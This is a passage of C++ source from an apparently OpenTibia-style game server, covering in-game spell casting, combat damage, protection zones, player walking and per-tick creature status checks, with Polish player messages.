        Player* spectator = dynamic_cast<Player*>(*it);

        if(!spectator)
            continue;

        if(bSuccess)
        {
            me->getDistanceShoot(spectator, creature, centerpos, hasTarget);

            std::vector<Position>::const_iterator tlIt;
            for(tlIt = poslist.begin(); tlIt != poslist.end(); ++tlIt)
            {
                Position pos = *tlIt;
                //Tile *tile = getTile(pos.x, pos.y, pos.z);
                Tile *tile = map->getTile(pos);
                const CreatureStateVec& creatureStateVec = gamestate.getCreatureStateList(tile);

                if(creatureStateVec.empty())   //no targets
                {
                    me->getMagicEffect(spectator, creature, NULL, pos, 0, targettile->isPz(), isBlocking);
                }
                else
                {
                    for(CreatureStateVec::const_iterator csIt = creatureStateVec.begin(); csIt != creatureStateVec.end(); ++csIt)
                    {
                        Creature *target = csIt->first;
                        const CreatureState& creatureState = csIt->second;

                        me->getMagicEffect(spectator, creature, target, target->pos, creatureState.damage, tile->isPz(), false);

                        //could be death due to a magic damage with no owner (fire/poison/energy)
                        if(creature && target->isRemoved == true)
                        {

                            for(std::vector<Creature*>::const_iterator cit = creatureState.attackerlist.begin(); cit != creatureState.attackerlist.end(); ++cit)
                            {
                                Creature* gainExpCreature = *cit;
                                if(dynamic_cast<Player*>(gainExpCreature))
                                    dynamic_cast<Player*>(gainExpCreature)->sendStats();

                                if(spectator->CanSee(gainExpCreature->pos.x, gainExpCreature->pos.y, gainExpCreature->pos.z))
                                {
                                    std::stringstream exp;
                                    exp << target->getGainedExperience(gainExpCreature);
                                    spectator->sendAnimatedText(gainExpCreature->pos, 0xD7, exp.str());
                                }
                            }

                        }

                        if(spectator->CanSee(target->pos.x, target->pos.y, target->pos.z))
                        {
                            if(creatureState.damage != 0
#ifdef HUCZU_HITS_KOMENDA
                                    && spectator->showHits
#endif
                              )
                            {
                                std::stringstream dmg;
                                dmg << std::abs(creatureState.damage);
                                if (me->attackType & ATTACK_PHYSICAL)
                                    spectator->sendAnimatedText(target->pos, target->bloodcolor, dmg.str());
                                else
                                    spectator->sendAnimatedText(target->pos, me->animationColor, dmg.str());
                            }

                            if(creatureState.manaDamage > 0
#ifdef HUCZU_HITS_KOMENDA
                                    && spectator->showHits
#endif
                              )
                            {
                                spectator->sendMagicEffect(target->pos, NM_ME_LOOSE_ENERGY);
                                std::stringstream manaDmg;
                                manaDmg << std::abs(creatureState.manaDamage);
                                spectator->sendAnimatedText(target->pos, 2, manaDmg.str());
                            }

                            if (target->health > 0)
                                spectator->sendCreatureHealth(target);

                            if (spectator == target)
                            {
                                CreateManaDamageUpdate(target, creature, creatureState.manaDamage);
                                CreateDamageUpdate(target, creature, creatureState.damage);
                            }
                        }
                    }
                }
            }
        }
        else
        {
            me->FailedToCast(spectator, creature, isBlocking, hasTarget);
        }

    }

    return bSuccess;
}

void Game::creatureApplyDamage(Creature *creature, int32_t damage, int32_t &outDamage, int32_t &outManaDamage
#ifdef YUR_PVP_ARENA
                               , CreatureVector* arenaLosers
#endif //YUR_PVP_ARENA
                              )
{
    outDamage = damage;
    outManaDamage = 0;

    if (damage > 0)
    {
        if (creature->manaShieldTicks >= 1000 && (damage < creature->mana) )
        {
            outManaDamage = damage;
            outDamage = 0;
        }
        else if (creature->manaShieldTicks >= 1000 && (damage > creature->mana) )
        {
            outManaDamage = creature->mana;
            outDamage -= outManaDamage;
        }
        else if((creature->manaShieldTicks < 1000) && (damage > creature->health))
            outDamage = creature->health;
        else if (creature->manaShieldTicks >= 1000 && (damage > (creature->health + creature->mana)))
        {
            outDamage = creature->health;
            outManaDamage = creature->mana;
        }

        if(creature->manaShieldTicks < 1000 || (creature->mana == 0))
#ifdef YUR_PVP_ARENA
            creature->drainHealth(outDamage, arenaLosers);
#else
            creature->drainHealth(outDamage);
#endif //YUR_PVP_ARENA
        else if(outManaDamage > 0)
        {
#ifdef YUR_PVP_ARENA
            creature->drainHealth(outDamage, arenaLosers);
#else
            creature->drainHealth(outDamage);
#endif //YUR_PVP_ARENA
            creature->drainMana(outManaDamage);
        }
        else
            creature->drainMana(outDamage);
    }
    else
    {
        int32_t newhealth = creature->health - damage;
        if(newhealth > creature->healthmax)
            newhealth = creature->healthmax;

        creature->health = newhealth;

        outDamage = creature->health - newhealth;
        outManaDamage = 0;
    }
}

bool Game::creatureCastSpell(Creature *creature, const Position& centerpos, const MagicEffectClass& me)
{

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureCastSpell()");

    if(me.offensive == false && me.damageEffect > 0 && creature->conditions.hasCondition(ATTACK_PARALYZE))
    {
        creature->removeCondition(ATTACK_PARALYZE);
        changeSpeed(creature->getID(), creature->getNormalSpeed()+creature->hasteSpeed);
        Player *player = dynamic_cast<Player*>(creature);
        if(player)
            player->sendIcons();
    }

    return creatureMakeMagic(creature, centerpos, &me);
}




bool Game::creatureThrowRune(Creature *creature, const Position& centerpos, const MagicEffectClass& me)
{

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureThrowRune()");

    bool ret = false;
    if(creature->pos.z != centerpos.z)
    {
        creature->sendCancel("Musisz byc na tym samym poziomie.");
    }

    else if((abs(creature->pos.x - centerpos.x) > 7 || abs(creature->pos.y - centerpos.y) > 6) && me.offensive)
    {
        Player* player = dynamic_cast<Player*>(creature);
        if(player)
            player->botMessage(BOT_CAVE);
    }

    //else if(!map->canThrowItemTo(creature->pos, centerpos, false, true)) {
    else if(map->canThrowObjectTo(creature->pos, centerpos, BLOCK_PROJECTILE) != RET_NOERROR)
    {
        creature->sendCancel("Nie mozesz rzucic tego przedmiotu tutaj.");
    }
    else
        ret = creatureMakeMagic(creature, centerpos, &me);



    return ret;
}

bool Game::creatureOnPrepareAttack(Creature *creature, Position pos)
{
    if(creature)
    {
        Player* player = dynamic_cast<Player*>(creature);

        //Tile* tile = (Tile*)getTile(creature->pos.x, creature->pos.y, creature->pos.z);
        Tile* tile = map->getTile(creature->pos);
        //Tile* targettile = getTile(pos.x, pos.y, pos.z);
        Tile* targettile = map->getTile(pos);

        if(creature->access < g_config.ACCESS_PROTECT)
        {
            if(tile && tile->isPz())
            {
                if(player)
                {
                    player->sendTextMessage(MSG_SMALLINFO, "Nie mozesz atakowac jesli jestes w protection zone!");
                    playerSetAttackedCreature(player, 0);
                }

                return false;
            }
            else if(targettile && targettile->isPz())
            {
                if(player)
                {
                    player->sendTextMessage(MSG_SMALLINFO, "Nie mozesz zaatakowac gracza w protection zone.");
                    playerSetAttackedCreature(player, 0);
                }

                return false;
            }
        }

        return true;
    }

    return false;
}

bool Game::creatureOnPrepareMagicAttack(Creature *creature, Position pos, const MagicEffectClass* me)
{
    if(!me->offensive || me->isIndirect() || creatureOnPrepareAttack(creature, pos))
    {
        /*
        	if(creature->access < ACCESS_PROTECT) {
        		if(!((std::abs(creature->pos.x-centerpos.x) <= 8) && (std::abs(creature->pos.y-centerpos.y) <= 6) &&
        			(creature->pos.z == centerpos.z)))
        			return false;
        	}
        */

        Player* player = dynamic_cast<Player*>(creature);
        bool success = true;
        if(player)
        {
            if(player->oneSiteAttack)
                switch(player->getDirection())
                {
                case NORTH:
                {
                    Tile *tile = getTile(pos.x, pos.y-1, pos.z);
                    if(tile && tile->isBlocking(BLOCK_SOLID,true,false))
                        success = false;
                    break;
                }
                case EAST:
                {
                    Tile *tile = getTile(pos.x+1, pos.y, pos.z);
                    if(tile && tile->isBlocking(BLOCK_SOLID,true,false))
                        success = false;
                    break;
                }
                case SOUTH:
                {
                    Tile *tile = getTile(pos.x, pos.y+1, pos.z);
                    if(tile && tile->isBlocking(BLOCK_SOLID,true,false))
                        success = false;
                    break;
                }
                case WEST:
                {
                    Tile *tile = getTile(pos.x-1, pos.y, pos.z);
                    if(tile && tile->isBlocking(BLOCK_SOLID,true,false))
                        success = false;
                    break;
                }
                }
            if(player->access < g_config.ACCESS_PROTECT)
            {
                if(player->exhaustedTicks >= 1000 && me->causeExhaustion(true))
                {
                    if(me->offensive)
                    {
                        player->sendTextMessage(MSG_SMALLINFO, "You are exhausted.", player->pos, NM_ME_PUFF);
                        player->exhaustedTicks += g_config.EXHAUSTED_ADD;
                    }

                    return false;
                }
                else if(player->mana < me->manaCost)
                {
                    player->sendTextMessage(MSG_SMALLINFO, "Nie masz wystarczajacej ilosci many.", player->pos, NM_ME_PUFF);
                    return false;
                }
                else if(!success)
                {
                    player->sendTextMessage(MSG_SMALLINFO, "Sciana.", player->pos, NM_ME_PUFF);
                    player->oneSiteAttack = false;
                    return false;
                }
                else
                    player->mana -= me->manaCost;
                //player->manaspent += me->manaCost;
                player->addManaSpent(me->manaCost);
            }
        }

        return true;
    }

    return false;
}

void Game::creatureMakeDamage(Creature *creature, Creature *attackedCreature, fight_t damagetype)
{
    if(!creatureOnPrepareAttack(creature, attackedCreature->pos))
        return;


    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureMakeDamage()");

    Player* player = dynamic_cast<Player*>(creature);
    Player* attackedPlayer = dynamic_cast<Player*>(attackedCreature);

    if(player && player->atkMode == 1 && attackedPlayer)
    {
        player->sendCancelAttacking();
        player->setAttackedCreature(NULL);
        stopEvent(player->eventCheckAttacking);
        player->eventCheckAttacking = 0;
        player->sendTextMessage(MSG_SMALLINFO, "Turn off secure mode if you really want to attack unmarked players.");
        return;
    }

    //Tile* targettile = getTile(attackedCreature->pos.x, attackedCreature->pos.y, attackedCreature->pos.z);
    Tile* targettile = map->getTile(attackedCreature->pos);

    bool inReach = false;

    switch(damagetype)
    {
    case FIGHT_MELEE:
        if((std::abs(creature->pos.x-attackedCreature->pos.x) <= 1) &&
                (std::abs(creature->pos.y-attackedCreature->pos.y) <= 1) &&
                (creature->pos.z == attackedCreature->pos.z) ||
                (player && player->vocation == VOCATION_KNIGHT && player->hasTwoSquareItem() && (std::abs(creature->pos.x-attackedCreature->pos.x) <= 3) &&
                 (std::abs(creature->pos.y-attackedCreature->pos.y) <= 3) &&
                 (creature->pos.z == attackedCreature->pos.z)))
        {
            if(map->canThrowObjectTo(creature->pos, attackedCreature->pos, BLOCK_PROJECTILE) == RET_NOERROR)
                inReach = true;
        }
        break;
    case FIGHT_DIST:
        if((std::abs(creature->pos.x-attackedCreature->pos.x) <= 8) &&
                (std::abs(creature->pos.y-attackedCreature->pos.y) <= 5) &&
                (creature->pos.z == attackedCreature->pos.z))
        {

            //if(map->canThrowItemTo(creature->pos, attackedCreature->pos, false, true))
            if(map->canThrowObjectTo(creature->pos, attackedCreature->pos, BLOCK_PROJECTILE) == RET_NOERROR)
                inReach = true;
        }
        break;
    case FIGHT_MAGICDIST:
        if((std::abs(creature->pos.x-attackedCreature->pos.x) <= 8) &&
                (std::abs(creature->pos.y-attackedCreature->pos.y) <= 5) &&
                (creature->pos.z == attackedCreature->pos.z))
        {

            //if(map->canThrowItemTo(creature->pos, attackedCreature->pos, false, true))
            if(map->canThrowObjectTo(creature->pos, attackedCreature->pos, BLOCK_PROJECTILE) == RET_NOERROR)
                inReach = true;
        }
        break;

    }

    if (player && player->access < g_config.ACCESS_PROTECT)
    {
#ifdef YUR_CVS_MODS
        player->inFightTicks = std::max(g_config.PZ_LOCKED, player->inFightTicks);
#else
        player->inFightTicks = (int32_t)g_config.PZ_LOCKED;
#endif //YUR_CVS_MODS

        player->sendIcons();
        if(attackedPlayer)
            player->pzLocked = true;

    }
    if(attackedPlayer && attackedPlayer->access < g_config.ACCESS_PROTECT)
    {
#ifdef YUR_CVS_MODS
        attackedPlayer->inFightTicks = std::max(g_config.PZ_LOCKED, attackedPlayer->inFightTicks);
#else
        attackedPlayer->inFightTicks = (int32_t)g_config.PZ_LOCKED;
#endif //YUR_CVS_MODS
        attackedPlayer->sendIcons();
    }

    if(!inReach)
    {
        return;
    }

    //We do all changes against a GameState to keep track of the changes,
    //need some more work to work for all situations...
    GameState gamestate(this, Range(creature->pos, attackedCreature->pos));

    gamestate.onAttack(creature, attackedCreature->pos, attackedCreature);

    const CreatureStateVec& creatureStateVec = gamestate.getCreatureStateList(targettile);
    const CreatureState& creatureState = creatureStateVec[0].second;

    if(player && (creatureState.damage > 0 || creatureState.manaDamage > 0))
    {
        player->addSkillTry(1);
    }
    else if(player)
        player->addSkillTry(1);


    SpectatorVec spectatorlist = gamestate.getSpectators();
    SpectatorVec::iterator it;

    for(it = spectatorlist.begin(); it != spectatorlist.end(); ++it)
    {
        Player* spectator = dynamic_cast<Player*>(*it);
        if(!spectator)
            continue;

        if(damagetype != FIGHT_MELEE)
        {
            spectator->sendDistanceShoot(creature->pos, attackedCreature->pos, creature->getSubFightType());
        }

        if (attackedCreature->manaShieldTicks < 1000 && (creatureState.damage == 0) &&
                (spectator->CanSee(attackedCreature->pos.x, attackedCreature->pos.y, attackedCreature->pos.z)))
        {
            spectator->sendMagicEffect(attackedCreature->pos, NM_ME_PUFF);
        }
        else if (attackedCreature->manaShieldTicks < 1000 && (creatureState.damage < 0) &&
                 (spectator->CanSee(attackedCreature->pos.x, attackedCreature->pos.y, attackedCreature->pos.z)))
        {
            spectator->sendMagicEffect(attackedCreature->pos, NM_ME_BLOCKHIT);
        }
        else
        {
            for(std::vector<Creature*>::const_iterator cit = creatureState.attackerlist.begin(); cit != creatureState.attackerlist.end(); ++cit)
            {
                Creature* gainexpCreature = *cit;
                if(dynamic_cast<Player*>(gainexpCreature))
                    dynamic_cast<Player*>(gainexpCreature)->sendStats();

                if(spectator->CanSee(gainexpCreature->pos.x, gainexpCreature->pos.y, gainexpCreature->pos.z))
                {
                    char exp[128];
                    sprintf(exp,"%lld",attackedCreature->getGainedExperience(gainexpCreature));
                    spectator->sendAnimatedText(gainexpCreature->pos, 0xD7, exp);
                }
            }

            if (spectator->CanSee(attackedCreature->pos.x, attackedCreature->pos.y, attackedCreature->pos.z))
            {
                if(creatureState.damage > 0
#ifdef HUCZU_HITS_KOMENDA
                        && spectrator->showHits
#endif
                  )
                {
                    std::stringstream dmg;
                    dmg << std::abs(creatureState.damage);
                    spectator->sendAnimatedText(attackedCreature->pos, attackedCreature->bloodcolor, dmg.str());
                    spectator->sendMagicEffect(attackedCreature->pos, attackedCreature->bloodeffect);
                }

                if(creatureState.manaDamage > 0
#ifdef HUCZU_HITS_KOMENDA
                        && spectrator->showHits
#endif
                  )
                {
                    std::stringstream manaDmg;
                    manaDmg << std::abs(creatureState.manaDamage);
                    spectator->sendMagicEffect(attackedCreature->pos, NM_ME_LOOSE_ENERGY);
                    spectator->sendAnimatedText(attackedCreature->pos, 2, manaDmg.str());
                }

                if (attackedCreature->health > 0)
                    spectator->sendCreatureHealth(attackedCreature);

                if (spectator == attackedCreature)
                {
                    CreateManaDamageUpdate(attackedCreature, creature, creatureState.manaDamage);
                    CreateDamageUpdate(attackedCreature, creature, creatureState.damage);
                }
            }
        }
    }

    if(damagetype != FIGHT_MELEE && player && g_config.ENDING_AMMO)
        player->removeDistItem();



}

std::list<Position> Game::getPathTo(Creature *creature, Position start, Position to, bool creaturesBlock)
{
    return map->getPathTo(creature, start, to, creaturesBlock);
}

std::list<Position> Game::getPathToEx(Creature *creature, Position start, Position to, bool creaturesBlock)
{
    return map->getPathToEx(creature, start, to, creaturesBlock);
}

void Game::checkPlayerWalk(uint32_t id)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkPlayerWalk");

    Player *player = getPlayerByID(id);

    if(!player || player->pathlist.empty())
        return;

    Position pos = player->pos;
    Direction dir = player->pathlist.front();
    player->pathlist.pop_front();

    switch (dir)
    {
    case NORTH:
        pos.y--;
        break;
    case EAST:
        pos.x++;
        break;
    case SOUTH:
        pos.y++;
        break;
    case WEST:
        pos.x--;
        break;
    case NORTHEAST:
        pos.x++;
        pos.y--;
        break;
    case NORTHWEST:
        pos.x--;
        pos.y--;
        break;
    case SOUTHWEST:
        pos.x--;
        pos.y++;
        break;
    case SOUTHEAST:
        pos.x++;
        pos.y++;
        break;
    }

    /*
    #ifdef __DEBUG__
    	std::cout << "move to: " << dir << std::endl;
    #endif
    */

    player->lastmove = OTSYS_TIME();
    this->thingMove(player, player, pos.x, pos.y, pos.z, 1);
    flushSendBuffers();

    if(!player->pathlist.empty())
    {
        int32_t ticks = (int32_t)player->getSleepTicks();
        /*
        #ifdef __DEBUG__
        		std::cout << "checkPlayerWalk - " << ticks << std::endl;
        #endif
        */
        player->eventAutoWalk = addEvent(makeTask(ticks, std::bind2nd(std::mem_fun(&Game::checkPlayerWalk), id)));
    }
    else
        player->eventAutoWalk = 0;
}

void Game::checkCreature(uint32_t id)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkCreature()");

    Creature *creature = getCreatureByID(id);

    if (creature && creature->isRemoved == false)
    {
        int32_t thinkTicks = 0;
        int32_t oldThinkTicks = creature->onThink(thinkTicks);

        if(thinkTicks > 0)
        {
            creature->eventCheck = addEvent(makeTask(thinkTicks, std::bind2nd(std::mem_fun(&Game::checkCreature), id)));
        }
        else
            creature->eventCheck = 0;

        if(Monster* monster = dynamic_cast<Monster*>(creature))
        {
            if(Tile *tile = map->getTile(monster->pos))
            {
                for(int32_t i = 0; i!=tile->downItems.size(); ++i)
                {
                    if(tile->downItems[i]->getID() == ITEM_CHMURKA)
                    {
                        removeCreature(creature);
                        return;
                    }
                }
            }
            else return;
        }

        Player* player = dynamic_cast<Player*>(creature);
        if(player)
        {
            //Tile *tile = getTile(player->pos.x, player->pos.y, player->pos.z);
            Tile *tile = map->getTile(player->pos);
            if(tile == NULL)
            {
                std::cout << "CheckPlayer NULL tile: " << player->getName() << std::endl;
                return;
            }

#ifdef CVS_DAY_CYCLE
            player->sendWorldLightLevel(lightlevel, 0xD7);
#endif //CVS_DAY_CYCLE
            player->checkAfk(thinkTicks);
#ifdef YUR_BOH
            player->checkBoh();
#endif //YUR_BOH
#ifdef YUR_RINGS_AMULETS
            player->checkRing(thinkTicks);
            if(player && player->items[SLOT_RING] && player->items[SLOT_RING]->getID() == ITEM_LIFE_RING_IN_USE && !tile->isPz())
            {
                player->mana += min(g_config.LIFE_RING_MANA, player->manamax - player->mana);
                player->health += min(g_config.LIFE_RING_ZYCIE, player->healthmax - player->health);
            }
            if(player && player->items[SLOT_RING] && player->items[SLOT_RING]->getID() == ITEM_RING_OF_HEALING_IN_USE && !tile->isPz())
            {
                player->mana += min(g_config.ROH_MANA, player->manamax - player->mana);
                player->health += min(g_config.ROH_ZYCIE, player->healthmax - player->health);
            }
#endif //YUR_RINGS_AMULETS
            if(player && player->items[SLOT_RING] && player->items[SLOT_RING]->getID() == ITEM_DIAMOND_RING && !tile->isPz())
            {
                player->mana += min(g_config.DIAMOND_RING_MANA, player->manamax - player->mana);
                player->health += min(g_config.DIAMOND_RING_HP, player->healthmax - player->health);
            }
            player->checkLightItem(thinkTicks);
#ifdef HUCZU_SKULLS
            if (player->checkSkull(thinkTicks))
                Skull(player);
#endif //HUCZU_SKULLS
#ifdef HUCZU_EXHAUSTED
            if(player->mmo > 0)
            {
                player->mmo -= 1;
            }
            if(player && player->mmo < 0)
            {
                player->mmo = 0;
            }
            if(player->lookex > 0)
            {
                player->lookex -= 1;
            }
            if(player && player->lookex < 0)
            {
                player->lookex = 0;
            }
            if(player && player->antyrainbow > 0)
            {
                player->antyrainbow -= 1;
            }
            if(player && player->antyrainbow < 0)
            {
                player->antyrainbow = 0;
            }
            if(player && player->antyrainbow2 > 0)
            {
                player->antyrainbow2 -= 1;
            }
            if(player && player->antyrainbow2 < 0)
            {
                player->antyrainbow2 = 0;
            }
#endif //HUCZU_EXHAUSTED
#ifdef YUR_PREMIUM_PROMOTION
            if(!g_config.FREE_PREMMY)
                player->checkPremium(thinkTicks);
#endif //YUR_PREMIUM_PROMOTION
            if (player->checkInvisible(thinkTicks))
                creatureChangeOutfit(player);
#ifdef HUCZU_SKULLS
            checkSkullTime(player);
#endif //HUCZU_SKULLS

            if(!tile->isPz())
            {
                if(player->food > 1000)
                {
                    //player->mana += min(5, player->manamax - player->mana);
                    player->gainManaTick();
                    player->food -= thinkTicks;
                    if(player->healthmax - player->health > 0)
                    {
                        //player->health += min(5, player->healthmax - player->health);
                        if(player->gainHealthTick())
                        {
                            SpectatorVec list;
                            SpectatorVec::iterator it;
                            getSpectators(Range(creature->pos), list);
                            for(it = list.begin(); it != list.end(); ++it)
                            {
                                Player* p = dynamic_cast<Player*>(*it);
                                if(p)
                                    p->sendCreatureHealth(player);
                            }
                        }
                    }
                }
            }

            //send stast only if have changed
            if(player->NeedUpdateStats())
            {
                player->sendStats();
            }

            player->sendPing(thinkTicks);

            if(player->inFightTicks >= 1000)
            {
                player->inFightTicks -= thinkTicks;

                if(player->inFightTicks < 1000)
                    player->pzLocked = false;
                player->sendIcons();
            }

            if(player->tradeTicks >= 1000)
            {
                player->tradeTicks -= thinkTicks;

                if(player->tradeTicks < 0)
                    player->tradeTicks = 0;
            }
            if(player->gameTicks >= 1000)
            {
                player->gameTicks -= thinkTicks;

                if(player->gameTicks < 0)
                    player->gameTicks = 0;
            }
            if(player->exhaustedTicks >= 1000)
            {
                player->exhaustedTicks -= thinkTicks;

                if(player->exhaustedTicks < 0)
                    player->exhaustedTicks = 0;
            }

            if(player->manaShieldTicks >=1000)
            {
                player->manaShieldTicks -= thinkTicks;

                if(player->manaShieldTicks  < 1000)
                    player->sendIcons();
            }

            if(player->hasteTicks >=1000)
            {
                player->hasteTicks -= thinkTicks;
            }
        }
        else
        {
            if(creature->manaShieldTicks >=1000)
            {
                creature->manaShieldTicks -= thinkTicks;
            }

            if(creature->hasteTicks >=1000)
            {
                creature->hasteTicks -= thinkTicks;
            }

            if (creature->checkInvisible(thinkTicks))
                creatureChangeOutfit(creature);
        }

        Conditions& conditions = creature->getConditions();
        for(Conditions::iterator condIt = conditions.begin(); condIt != conditions.end(); ++condIt)
        {
            if(condIt->first == ATTACK_FIRE || condIt->first == ATTACK_ENERGY || condIt->first == ATTACK_POISON)
            {
                ConditionVec &condVec = condIt->second;

                if(condVec.empty())
                    continue;

                CreatureCondition& condition = condVec[0];

                if(condition.onTick(oldThinkTicks))
                {
                    const MagicEffectTargetCreatureCondition* magicTargetCondition =  condition.getCondition();
                    Creature* c = getCreatureByID(magicTargetCondition->getOwnerID());
                    creatureMakeMagic(c, creature->pos, magicTargetCondition);

                    if(condition.getCount() <= 0)
                    {
                        condVec.erase(condVec.begin());
                    }
                }
            }
            if(condIt->first == ATTACK_PARALYZE)
            {
                ConditionVec &condVec = condIt->second;
                if(condVec.empty())
                    continue;

                CreatureCondition& condition = condVec[0];
                if(condition.onTick(oldThinkTicks))
                {
                    //Player* player = dynamic_cast<Player*>(creature);
                    if(creature->getImmunities() != ATTACK_PARALYZE)
                    {
                        changeSpeed(creature->getID(), 100);
                        if(player)
                        {
                            player->sendTextMessage(MSG_SMALLINFO, "You are paralyzed.");
                            player->sendIcons();
                        }
                    }

                    if(condition.getCount() <= 0)
                    {
                        condVec.erase(condVec.begin());
                        changeSpeed(creature->getID(), creature->getNormalSpeed()+creature->hasteSpeed);
                        if(player)
                        {
                            player->sendIcons();
                        }
                    }
                }
            }
            if(condIt->first == ATTACK_DRUNKNESS)
            {
                ConditionVec &condVec = condIt->second;
                if(condVec.empty())
                    continue;

                CreatureCondition& condition = condVec[0];
                if(condition.onTick(oldThinkTicks))
                {
                    //Player* player = dynamic_cast<Player*>(creature);
                    if(creature->getImmunities() != ATTACK_DRUNKNESS)
                    {
                        int32_t random = random_range(1,100);
                        if(random <= 25)
                        {
                            creatureSay(creature, SPEAK_MONSTER1, "Hicks!");
                            Position pos = player->pos;
                            int32_t randomwalk = random_range(1,4);
                            switch(randomwalk)
                            {
                            case 1:
                                pos.x++;
                                break;
                            case 2:
                                pos.x--;
                                break;
                            case 3:
                                pos.y++;
                                break;
                            case 4:
                                pos.y--;
                                break;
                            }
                            Tile* toTile = getTile(pos.x, pos.y, pos.z);
                            //make sure they don't get teleported into a place they shouldn't
                            if(toTile &&
                                    toTile->isBlocking(1, false, false) == RET_NOERROR &&
                                    toTile->isBlocking(2, false, false) == RET_NOERROR &&
                                    toTile->isBlocking(4, false, false) == RET_NOERROR &&
                                    toTile->isBlocking(8, false, false) == RET_NOERROR &&
                                    toTile->isBlocking(16, false, false) == RET_NOERROR)
                                teleport(player,pos);
                        }
                        //player->drunkTicks -= thinkTicks;
                        player->sendIcons();
                    }

                    if(condition.getCount() <= 0)
                    {
                        condVec.erase(condVec.begin());
                        if(player)
                        {
                            player->sendIcons();
                        }
                    }
                }
            }
        }
        flushSendBuffers();
    }
}

void Game::changeOutfit(uint32_t id, int32_t looktype)
{

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::changeOutfit()");

    Creature *creature = getCreatureByID(id);
    if(creature)
    {
        creature->looktype = looktype;
        creatureChangeOutfit(creature);
    }
}

void Game::changeOutfitAfter(uint32_t id, int32_t looktype, int32_t time)
{
    addEvent(makeTask(time, boost::bind(&Game::changeOutfit, this,id, looktype)));
}

void Game::changeSpeed(uint32_t id, uint16_t speed)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::changeSpeed()");
    Creature *creature = getCreatureByID(id);
    if(creature && /*creature->hasteTicks < 1000 && */creature->speed != speed)
    {
        creature->speed = speed;
        Player* player = dynamic_cast<Player*>(creature);
        if(player)
        {
            player->sendChangeSpeed(creature);
            player->sendIcons();
        }
        SpectatorVec list;
        SpectatorVec::iterator it;
        getSpectators(Range(creature->pos), list);
        //for(uint32_t i = 0; i < list.size(); i++)
        for(it = list.begin(); it != list.end(); ++it)
        {
            Player* p = dynamic_cast<Player*>(*it);
            if(p)
                p->sendChangeSpeed(creature);
        }
    }
}


void Game::checkCreatureAttacking(uint32_t id)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkCreatureAttacking()");

    Creature *creature = getCreatureByID(id);
    if (creature != NULL && creature->isRemoved == false)
    {
        creature->eventCheckAttacking = 0;
        Monster *monster = dynamic_cast<Monster*>(creature);
        if (monster)
        {
            monster->onAttack();
        }
        else
        {
            if (creature->attackedCreature != 0)
            {
                Creature *attackedCreature = getCreatureByID(creature->attackedCreature);

                if (attackedCreature)
                {
                    //Tile* fromtile = getTile(creature->pos.x, creature->pos.y, creature->pos.z);
                    Tile* fromtile = map->getTile(creature->pos);
                    if(fromtile == NULL)
                    {
                        std::cout << "checkCreatureAttacking NULL tile: " << creature->getName() << std::endl;
                        //return;
                    }
                    if (!attackedCreature->isAttackable() == 0 && fromtile && fromtile->isPz() && creature->access < g_config.ACCESS_PROTECT)
                    {
                        Player* player = dynamic_cast<Player*>(creature);
                        if (player)
                        {
                            player->sendTextMessage(MSG_SMALLINFO, "Nie mozesz zaatakowac gracza w protection zone.");
                            //player->sendCancelAttacking();
                            playerSetAttackedCreature(player, 0);
                            return;
                        }
                    }
                    else
                    {
                        if (attackedCreature->isInvisible())
                        {
                            Player* player = dynamic_cast<Player*>(creature);
                            Player* attackedPlayer = dynamic_cast<Player*>(attackedCreature);

                            if (player && !attackedPlayer)
                            {
                                player->sendTextMessage(MSG_SMALLINFO, "Obiekt zgubiony.");
                                playerSetAttackedCreature(player, 0);
#ifdef HUCZU_FOLLOW
                                playerSetFollowCreature(player, 0);
#endif //HUCZU_FOLLOW
                                return;
                            }
                        }
                        if (!attackedCreature->isRemoved)
                        {
                            Player* player = dynamic_cast<Player*>(creature);
                            if (player)
                            {
                                if (player->isUsingBurstArrows())
                                    burstArrow(player, attackedCreature->pos);
                                if (player->vocation == VOCATION_PALADIN && player->isUsingGoldBolt())
                                    goldBolt(player, attackedCreature->pos);
                                if ((player->vocation == VOCATION_DRUID || player->vocation == VOCATION_SORCERER) && player->isUsingSilverWand())
                                    silverWand(player, attackedCreature->pos);
                                int32_t wandid = player->getWandId();
                                if (wandid > 0)
                                    useWand(player, attackedCreature, wandid);

                            }
                            this->creatureMakeDamage(creature, attackedCreature, creature->getFightType());
                        }
                    }
                    Player* player = dynamic_cast<Player*>(creature);
                    int32_t speed = 0;
                    if(player)
                    {
                        switch(player->vocation)
                        {
                        case 0:
                            speed = (int32_t)(g_config.NO_VOCATION_SPEED * 1000);
                            creature->eventCheckAttacking = addEvent(makeTask(speed, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
                            break;
                        case 1:
                            speed = (int32_t)(g_config.SORCERER_SPEED * 1000);
                            creature->eventCheckAttacking = addEvent(makeTask(speed, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
                            break;
                        case 2:
                            speed = (int32_t)(g_config.DRUID_SPEED * 1000);
                            creature->eventCheckAttacking = addEvent(makeTask(speed, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
                            break;
                        case 3:
                            speed = (int32_t)(g_config.PALADIN_SPEED * 1000);
                            creature->eventCheckAttacking = addEvent(makeTask(speed, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
                            break;
                        case 4:
                            speed = (int32_t)(g_config.KNIGHT_SPEED * 1000);
                            creature->eventCheckAttacking = addEvent(makeTask(speed, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
                            break;
                        default:
                            creature->eventCheckAttacking = addEvent(makeTask(2000, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
                            break;
                        }
#ifdef HUCZU_FOLLOW
                        if(player->followMode != 0 && attackedCreature && attackedCreature != player->oldAttackedCreature)
                        {
                            player->oldAttackedCreature = attackedCreature;
                            playerSetFollowCreature(player, attackedCreature->getID());
                        }
                        else
                        {
                            player->oldAttackedCreature = NULL;
                            playerSetFollowCreature(player, 0);
                        }
#endif //HUCZU_FOLLOW
                    }
                }
            }
        }
        flushSendBuffers();
    }


}

void Game::checkDecay(int32_t t)
{
